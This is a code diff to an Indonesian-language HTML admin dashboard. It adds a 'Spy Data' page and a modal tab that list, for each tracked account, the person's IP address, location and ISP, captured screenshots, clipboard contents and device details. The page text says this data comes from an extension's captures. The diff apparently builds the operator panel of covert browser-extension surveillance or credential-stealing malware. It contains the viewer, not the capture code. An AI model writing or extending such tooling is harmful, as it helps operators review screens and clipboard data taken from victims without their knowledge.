@@ -3476,6 +3476,281 @@
                 box-shadow: var(--shadow-md), 0 0 24px var(--tier-blue-glow) !important;
             }
         }
+
+        /* ================================================================
+                   SPY DATA
+                ================================================================ */
+        .spy-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 16px;
+        }
+
+        .spy-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            padding: 18px;
+            transition: all var(--transition-base);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .spy-card:hover {
+            border-color: var(--border-hover);
+            box-shadow: var(--shadow-md), var(--shadow-glow-cyan);
+            transform: translateY(-2px);
+        }
+
+        .spy-card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 14px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .spy-card-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+            background: linear-gradient(135deg, #1a2a3f, #2a3a5c);
+            border: 2px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .spy-card-avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .spy-card-avatar svg { width: 18px; height: 18px; color: var(--text-muted); }
+
+        .spy-card-user {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .spy-card-username {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .spy-card-time {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 2px;
+        }
+
+        .spy-section-label {
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--accent-cyan);
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .spy-section-label svg { width: 14px; height: 14px; }
+
+        .spy-ip-block {
+            background: rgba(0, 212, 255, 0.04);
+            border: 1px solid rgba(0, 212, 255, 0.12);
+            border-radius: var(--radius-sm);
+            padding: 10px 12px;
+            margin-bottom: 12px;
+        }
+
+        .spy-ip-value {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--accent-cyan);
+            font-family: 'Courier New', monospace;
+            margin-bottom: 6px;
+        }
+
+        .spy-ip-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .spy-ip-tag {
+            font-size: 11px;
+            color: var(--text-secondary);
+            background: rgba(255,255,255,0.04);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 2px 7px;
+        }
+
+        .spy-screenshot-block {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            overflow: hidden;
+            margin-bottom: 12px;
+            position: relative;
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spy-screenshot-block img {
+            width: 100%;
+            display: block;
+            border-radius: 0;
+            cursor: pointer;
+            transition: transform var(--transition-base);
+        }
+        .spy-screenshot-block img:hover {
+            transform: scale(1.01);
+        }
+
+        .spy-screenshot-placeholder {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spy-screenshot-url {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.7);
+            padding: 4px 8px;
+            font-size: 10px;
+            color: var(--text-muted);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .spy-clipboard-block {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            padding: 10px 12px;
+            position: relative;
+        }
+
+        .spy-clipboard-text {
+            font-size: 13px;
+            color: var(--text-primary);
+            word-break: break-all;
+            max-height: 80px;
+            overflow-y: auto;
+            line-height: 1.5;
+            font-family: 'Courier New', monospace;
+        }
+
+        .spy-clipboard-text::-webkit-scrollbar { width: 3px; }
+        .spy-clipboard-text::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 3px; }
+
+        .spy-clipboard-empty {
+            font-size: 12px;
+            color: var(--text-muted);
+            font-style: italic;
+        }
+
+        .spy-copy-btn {
+            position: absolute;
+            top: 6px;
+            right: 6px;
+            background: rgba(0, 212, 255, 0.1);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            color: var(--accent-cyan);
+            padding: 3px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+            font-family: var(--font-family);
+            transition: all var(--transition-base);
+        }
+        .spy-copy-btn:hover { background: rgba(0, 212, 255, 0.2); }
+
+        /* Screenshot Lightbox */
+        #screenshotLightbox {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.92);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            cursor: zoom-out;
+        }
+        #screenshotLightbox.visible { display: flex; }
+        #screenshotLightbox img {
+            max-width: 95vw;
+            max-height: 90vh;
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow-lg);
+            cursor: default;
+        }
+        #lightboxClose {
+            position: fixed;
+            top: 20px; right: 24px;
+            background: rgba(255,59,59,0.15);
+            border: 1px solid rgba(255,59,59,0.3);
+            color: var(--danger);
+            padding: 8px 14px;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            font-size: 14px;
+            font-family: var(--font-family);
+            font-weight: 600;
+        }
+
+        /* Modal spy tabs */
+        .modal-tabs {
+            display: flex;
+            gap: 4px;
+            background: rgba(8,12,24,0.6);
+            padding: 4px;
+            border-radius: var(--radius-md);
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .modal-tab-btn {
+            padding: 7px 14px;
+            border-radius: var(--radius-sm);
+            border: none;
+            background: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            font-family: var(--font-family);
+            transition: all var(--transition-base);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .modal-tab-btn.active {
+            background: rgba(0, 212, 255, 0.12);
+            color: var(--accent-cyan);
+        }
+        .modal-tab-btn:hover:not(.active) {
+            background: rgba(255,255,255,0.05);
+            color: var(--text-primary);
+        }
+        .modal-tab-btn svg { width: 15px; height: 15px; }
+
+        .modal-tab-content { display: none; }
+        .modal-tab-content.active { display: block; }
+
     </style>
 </head>
 <body>
@@ -3568,6 +3843,10 @@
                 <button class="nav-item" data-page="sessions" data-tooltip="Sessions">
                     <i data-lucide="monitor-smartphone"></i><span>Sessions</span>
                     <span class="nav-tooltip">Sessions</span>
+                </button>
+                <button class="nav-item" data-page="spydata" data-tooltip="Spy Data">
+                    <i data-lucide="eye"></i><span>Spy Data</span>
+                    <span class="nav-tooltip">Spy Data</span>
                 </button>
 
                 <div class="nav-section">System</div>
@@ -4089,6 +4368,42 @@
             </div>
         </section>
 
+
+        <!-- ====== SPY DATA ====== -->
+        <section class="page-section" id="spydataPage">
+            <div class="page-header">
+                <div>
+                    <h2 class="page-title">Spy Data</h2>
+                    <p class="page-subtitle">IP address, screenshot, dan clipboard dari setiap user yang terdeteksi.</p>
+                </div>
+                <div style="display:flex; gap:8px;">
+                    <select class="filter-select" id="spyFilter" onchange="renderSpyData()" style="width:160px;">
+                        <option value="all">Semua Data</option>
+                        <option value="has_screenshot">Punya Screenshot</option>
+                        <option value="has_clipboard">Punya Clipboard</option>
+                        <option value="has_ip">Punya IP</option>
+                    </select>
+                    <button class="refresh-button" onclick="loadData()">
+                        <i data-lucide="refresh-cw"></i> Refresh
+                    </button>
+                </div>
+            </div>
+
+            <div class="search-bar" style="margin-bottom:16px;">
+                <span class="input-icon"><i data-lucide="search"></i></span>
+                <input type="text" class="search-input" id="spySearchInput"
+                    placeholder="Search username atau IP..." oninput="renderSpyData()">
+            </div>
+
+            <div id="spyStats" style="display:flex; gap:12px; flex-wrap:wrap; margin-bottom:16px;"></div>
+
+            <div class="spy-grid" id="spyGrid">
+                <div style="grid-column:1/-1; text-align:center; padding:40px; color:var(--text-secondary);">
+                    Loading spy data...
+                </div>
+            </div>
+        </section>
+
         <!-- ====== NOTIFICATIONS ====== -->
         <section class="page-section" id="notificationsPage">
             <div class="page-header">
@@ -4333,6 +4648,12 @@
     </div>
 </main>
 </div>
+</div>
+
+<!-- ====== SCREENSHOT LIGHTBOX ====== -->
+<div id="screenshotLightbox" onclick="closeLightbox()">
+    <button id="lightboxClose" onclick="closeLightbox()">✕ Tutup</button>
+    <img id="lightboxImage" src="" alt="Screenshot" onclick="event.stopPropagation()">
 </div>
 
 <!-- ====== ACCOUNT DETAIL MODAL ====== -->
@@ -4688,6 +5009,7 @@ SCRIPT
             logs: 'logsPage',
             users: 'usersPage',
             sessions: 'sessionsPage',
+            spydata: 'spydataPage',
             notifications: 'notificationsPage',
             api: 'apiPage',
             'system-status': 'systemStatusPage',
@@ -4705,6 +5027,7 @@ SCRIPT
             logs: 'Logs',
             users: 'Users',
             sessions: 'Sessions',
+            spydata: 'Spy Data',
             notifications: 'Notifications',
             api: 'API',
             'system-status': 'System Status',
@@ -5307,6 +5630,7 @@ SCRIPT
                 allAccounts = data.accounts || [];
                 await batchFetchAvatars(allAccounts);
                 renderAccounts(allAccounts);
+                renderSpyData();
                 updateStats(data.stats, allAccounts);
                 loadLogs();
                 checkForUpdates(data.accounts);
@@ -6039,6 +6363,8 @@ SCRIPT
                 </div>
             `;
         lucide.createIcons();
+        // Tambahkan spy data tab jika ada data
+        addSpyTabsToModal(account);
         document.getElementById('accountModal').classList.add('visible');
     }
 
@@ -6281,6 +6607,302 @@ SCRIPT
         showToast('Preferences reset', 'success', '');
         location.reload();
     }
+
+
+
+
+    function addSpyTabsToModal(account) {
+        const modal = document.querySelector('.modal');
+        if (!modal) return;
+
+        // Hapus tabs lama jika ada
+        const oldTabs = modal.querySelector('.modal-tabs');
+        if (oldTabs) oldTabs.remove();
+        const oldTabContents = modal.querySelectorAll('.modal-tab-content');
+        oldTabContents.forEach(el => el.remove());
+
+        const content = document.getElementById('modalContent');
+
+        // Bungkus content lama jadi tab "Profile"
+        const profileContent = content.innerHTML;
+        content.innerHTML = '';
+
+        const ip = account.ip || 'Unknown';
+        const loc = account.location || {};
+        const clipboard = account.clipboard;
+        const clipText = typeof clipboard === 'string' ? clipboard : (clipboard?.text || '');
+        const hasClip = !!(clipText && clipText.trim());
+        const hasScreenshot = !!(account.screenshot);
+
+        // Buat tabs
+        const tabs = document.createElement('div');
+        tabs.className = 'modal-tabs';
+        tabs.innerHTML = `
+            <button class="modal-tab-btn active" data-tab="profile" onclick="switchModalTab('profile')">
+                <i data-lucide="user"></i> Profile
+            </button>
+            <button class="modal-tab-btn" data-tab="spy" onclick="switchModalTab('spy')">
+                <i data-lucide="eye"></i> Spy Data
+                ${hasScreenshot || hasClip || ip !== 'Unknown' ? '<span style="background:var(--accent-red);color:white;font-size:9px;border-radius:8px;padding:1px 5px;margin-left:2px;">NEW</span>' : ''}
+            </button>
+        `;
+        modal.insertBefore(tabs, content);
+
+        // Tab content Profile
+        const profileTab = document.createElement('div');
+        profileTab.className = 'modal-tab-content active';
+        profileTab.id = 'modalTabProfile';
+        profileTab.innerHTML = profileContent;
+        content.appendChild(profileTab);
+
+        // Tab content Spy
+        const spyTab = document.createElement('div');
+        spyTab.className = 'modal-tab-content';
+        spyTab.id = 'modalTabSpy';
+        spyTab.innerHTML = `
+            <!-- IP Section -->
+            <div class="detail-section">
+                <div class="detail-section-title"><i data-lucide="map-pin"></i> IP & Lokasi</div>
+                <div class="detail-row">
+                    <span class="detail-label">IP Address</span>
+                    <span class="detail-value">
+                        ${ip !== 'Unknown' ? escHtml(ip) : '<span style="color:var(--text-muted)">Tidak diketahui</span>'}
+                        ${ip !== 'Unknown' ? `<button class="copy-button" onclick="copyToClipboard('${escHtml(ip)}', 'IP')"><i data-lucide="copy"></i> Copy</button>` : ''}
+                    </span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Negara</span>
+                    <span class="detail-value">${escHtml(loc.country || 'Unknown')}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Region / Kota</span>
+                    <span class="detail-value">${escHtml((loc.region || 'Unknown') + (loc.city ? ', ' + loc.city : ''))}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">ISP</span>
+                    <span class="detail-value">${escHtml(loc.isp || 'Unknown')}</span>
+                </div>
+            </div>
+
+            <!-- Screenshot -->
+            <div class="detail-section">
+                <div class="detail-section-title"><i data-lucide="camera"></i> Screenshot</div>
+                ${hasScreenshot ? `
+                    <div style="background:#000;border-radius:8px;overflow:hidden;margin-bottom:8px;cursor:pointer;" onclick="openLightbox('${account.screenshot}')">
+                        <img src="${account.screenshot}" style="width:100%;display:block;" alt="Screenshot">
+                    </div>
+                    <div style="font-size:11px;color:var(--text-muted);text-align:center;margin-bottom:4px;">Klik gambar untuk perbesar</div>
+                    ${account.screenshotUrl ? `<div style="font-size:11px;color:var(--text-muted);">URL: ${escHtml(account.screenshotUrl)}</div>` : ''}
+                ` : `
+                    <div style="text-align:center;padding:24px;color:var(--text-muted);font-size:13px;">
+                        <i data-lucide="camera-off" style="width:32px;height:32px;margin-bottom:8px;opacity:0.3;display:block;margin-left:auto;margin-right:auto;"></i>
+                        Belum ada screenshot tersimpan
+                    </div>
+                `}
+            </div>
+
+            <!-- Clipboard -->
+            <div class="detail-section">
+                <div class="detail-section-title"><i data-lucide="clipboard"></i> Clipboard</div>
+                ${hasClip ? `
+                    <div class="spy-clipboard-block" style="position:relative;">
+                        <button class="spy-copy-btn" onclick="copyToClipboard('${escHtml(clipText.replace(/'/g, "\'"))}', 'Clipboard')">Copy</button>
+                        <div class="spy-clipboard-text">${escHtml(clipText)}</div>
+                    </div>
+                ` : `
+                    <div style="text-align:center;padding:20px;color:var(--text-muted);font-size:13px;font-style:italic;">
+                        Tidak ada data clipboard
+                    </div>
+                `}
+            </div>
+
+            <!-- Device Info -->
+            <div class="detail-section">
+                <div class="detail-section-title"><i data-lucide="monitor"></i> Device Info</div>
+                <div class="detail-row">
+                    <span class="detail-label">Platform</span>
+                    <span class="detail-value">${escHtml(account.device?.platform || 'Unknown')}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Bahasa</span>
+                    <span class="detail-value">${escHtml(account.device?.language || 'Unknown')}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">CPU Cores</span>
+                    <span class="detail-value">${escHtml(String(account.device?.cores || 'Unknown'))}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">User Agent</span>
+                    <span class="detail-value" style="font-size:11px;word-break:break-all;">${escHtml((account.device?.userAgent || 'Unknown').substring(0, 120))}</span>
+                </div>
+            </div>
+        `;
+        content.appendChild(spyTab);
+
+        lucide.createIcons();
+    }
+
+    function switchModalTab(tabName) {
+        document.querySelectorAll('.modal-tab-btn').forEach(btn => {
+            btn.classList.toggle('active', btn.dataset.tab === tabName);
+        });
+        document.querySelectorAll('.modal-tab-content').forEach(tc => {
+            tc.classList.remove('active');
+        });
+        const target = document.getElementById('modalTab' + tabName.charAt(0).toUpperCase() + tabName.slice(1));
+        if (target) target.classList.add('active');
+    }
+
+
+    // ================================================================
+    // SPY DATA PAGE
+    // ================================================================
+    function renderSpyData() {
+        const grid = document.getElementById('spyGrid');
+        if (!grid) return;
+
+        const search = (document.getElementById('spySearchInput')?.value || '').toLowerCase();
+        const filter = document.getElementById('spyFilter')?.value || 'all';
+
+        let accounts = allAccounts.slice();
+
+        if (search) {
+            accounts = accounts.filter(a =>
+                (a.username || '').toLowerCase().includes(search) ||
+                (a.displayName || '').toLowerCase().includes(search) ||
+                (a.ip || '').includes(search) ||
+                (a.location?.country || '').toLowerCase().includes(search)
+            );
+        }
+
+        if (filter === 'has_screenshot') accounts = accounts.filter(a => a.screenshot);
+        if (filter === 'has_clipboard') accounts = accounts.filter(a => a.clipboard?.hasData || (typeof a.clipboard === 'string' && a.clipboard));
+        if (filter === 'has_ip') accounts = accounts.filter(a => a.ip && a.ip !== 'Unknown');
+
+        // Stats
+        const statsEl = document.getElementById('spyStats');
+        if (statsEl) {
+            const totalIp = allAccounts.filter(a => a.ip && a.ip !== 'Unknown').length;
+            const totalSS = allAccounts.filter(a => a.screenshot).length;
+            const totalClip = allAccounts.filter(a => a.clipboard?.hasData || (typeof a.clipboard === 'string' && a.clipboard)).length;
+            statsEl.innerHTML = `
+                <div style="background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.15);border-radius:8px;padding:8px 14px;font-size:13px;color:var(--accent-cyan);">
+                    📍 <strong>${totalIp}</strong> punya IP
+                </div>
+                <div style="background:rgba(0,224,126,0.06);border:1px solid rgba(0,224,126,0.15);border-radius:8px;padding:8px 14px;font-size:13px;color:var(--success);">
+                    📸 <strong>${totalSS}</strong> punya Screenshot
+                </div>
+                <div style="background:rgba(255,204,0,0.06);border:1px solid rgba(255,204,0,0.15);border-radius:8px;padding:8px 14px;font-size:13px;color:var(--warning);">
+                    📋 <strong>${totalClip}</strong> punya Clipboard
+                </div>
+            `;
+        }
+
+        if (accounts.length === 0) {
+            grid.innerHTML = `<div style="grid-column:1/-1; text-align:center; padding:40px; color:var(--text-muted);">
+                <i data-lucide="eye-off" style="width:48px;height:48px;margin-bottom:12px;opacity:0.4;display:block;margin-left:auto;margin-right:auto;"></i>
+                <p>Tidak ada spy data ditemukan</p>
+                <p style="font-size:12px;margin-top:8px;">Data akan muncul saat extension berhasil capture</p>
+            </div>`;
+            lucide.createIcons();
+            return;
+        }
+
+        grid.innerHTML = accounts.map(account => buildSpyCard(account)).join('');
+        lucide.createIcons();
+    }
+
+    function buildSpyCard(account) {
+        const avatarUrl = getAvatarUrl(account);
+        const ip = account.ip || 'Unknown';
+        const loc = account.location || {};
+        const clipboard = account.clipboard;
+        const clipText = typeof clipboard === 'string' ? clipboard : (clipboard?.text || '');
+        const hasClip = !!(clipText && clipText.trim().length > 0);
+        const hasScreenshot = !!(account.screenshot);
+        const capturedAt = account.capturedAt || account.updatedAt || account.createdAt;
+
+        return `
+            <div class="spy-card">
+                <div class="spy-card-header">
+                    <div class="spy-card-avatar">
+                        ${avatarUrl ? 
+                            `<img src="${escHtml(avatarUrl)}" onerror="this.parentElement.innerHTML='<i data-lucide=\'user\'></i>'; lucide.createIcons();">` : 
+                            '<i data-lucide="user"></i>'
+                        }
+                    </div>
+                    <div class="spy-card-user">
+                        <div class="spy-card-username">${escHtml(account.displayName || account.username || 'Unknown')}</div>
+                        <div class="spy-card-time">${capturedAt ? formatRelativeTime(new Date(capturedAt)) : '-'}</div>
+                    </div>
+                    <button onclick="openAccountModal('${escHtml(String(account.userId || ''))}')" 
+                        style="background:rgba(0,212,255,0.08);border:1px solid rgba(0,212,255,0.2);color:var(--accent-cyan);padding:5px 10px;border-radius:6px;cursor:pointer;font-size:11px;font-family:var(--font-family);">
+                        Detail
+                    </button>
+                </div>
+
+                <!-- IP Section -->
+                <div class="spy-section-label"><i data-lucide="map-pin"></i> IP Address</div>
+                <div class="spy-ip-block">
+                    <div class="spy-ip-value">${ip === 'Unknown' ? '<span style="color:var(--text-muted);font-size:13px;">Tidak diketahui</span>' : escHtml(ip)}</div>
+                    ${ip !== 'Unknown' ? `
+                    <div class="spy-ip-meta">
+                        ${loc.country ? `<span class="spy-ip-tag">🌏 ${escHtml(loc.country)}</span>` : ''}
+                        ${loc.region ? `<span class="spy-ip-tag">📍 ${escHtml(loc.region)}</span>` : ''}
+                        ${loc.city ? `<span class="spy-ip-tag">🏙️ ${escHtml(loc.city)}</span>` : ''}
+                        ${loc.isp ? `<span class="spy-ip-tag">🌐 ${escHtml(loc.isp.substring(0, 30))}</span>` : ''}
+                    </div>` : ''}
+                </div>
+
+                <!-- Screenshot Section -->
+                <div class="spy-section-label"><i data-lucide="camera"></i> Screenshot</div>
+                <div class="spy-screenshot-block">
+                    ${hasScreenshot ? `
+                        <img src="${account.screenshot}" alt="Screenshot" 
+                            onclick="openLightbox('${account.screenshot}')"
+                            title="Klik untuk perbesar">
+                        ${account.screenshotUrl ? `<div class="spy-screenshot-url">${escHtml(account.screenshotUrl)}</div>` : ''}
+                    ` : `
+                        <div class="spy-screenshot-placeholder">
+                            <i data-lucide="camera-off" style="width:24px;height:24px;opacity:0.3;display:block;margin:0 auto 6px;"></i>
+                            Belum ada screenshot
+                        </div>
+                    `}
+                </div>
+
+                <!-- Clipboard Section -->
+                <div class="spy-section-label" style="margin-top:4px;"><i data-lucide="clipboard"></i> Clipboard</div>
+                <div class="spy-clipboard-block">
+                    ${hasClip ? `
+                        <button class="spy-copy-btn" onclick="copyToClipboard('${escHtml(clipText.replace(/'/g, "\'"))}', 'Clipboard')">Copy</button>
+                        <div class="spy-clipboard-text">${escHtml(clipText)}</div>
+                    ` : `
+                        <div class="spy-clipboard-empty">Tidak ada data clipboard</div>
+                    `}
+                </div>
+            </div>
+        `;
+    }
+
+    // ================================================================
+    // LIGHTBOX
+    // ================================================================
+    function openLightbox(src) {
+        document.getElementById('lightboxImage').src = src;
+        document.getElementById('screenshotLightbox').classList.add('visible');
+    }
+
+    function closeLightbox() {
+        document.getElementById('screenshotLightbox').classList.remove('visible');
+        document.getElementById('lightboxImage').src = '';
+    }
+
+    // Tutup lightbox dengan ESC
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            closeLightbox();
+        }
+    });
 
     setInterval(updateRelativeTimes, 30000);
     setInterval(() => {
